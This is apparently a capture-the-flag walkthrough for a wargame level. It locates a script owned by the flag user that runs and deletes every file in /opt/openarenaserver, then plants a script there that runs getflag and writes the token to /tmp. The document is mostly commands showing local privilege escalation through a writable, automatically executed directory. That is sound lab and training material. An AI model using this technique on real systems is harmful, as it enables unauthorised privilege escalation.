STEP:
    ls
    -> nothing
    find / -user flag05 2> /dev/null
    ->/usr/sbin/openarenaserver
    ->/rofs/usr/sbin/openarenaserver
    cat /usr/sbin/openarenaserver
    ->
        #!/bin/sh
        for i in /opt/openarenaserver/* ; do
        	(ulimit -t 5; bash -x "$i")
        	rm -f "$i"
        done
    ->
    obvious vunerability
    echo "getflag > /tmp/token_level05" > /opt/openarenaserver/script.sh && chmod +x /opt/openarenaserver/script.sh

END:
    We wait until the script has been executed and we execute
    -> cat /tmp/token_level05
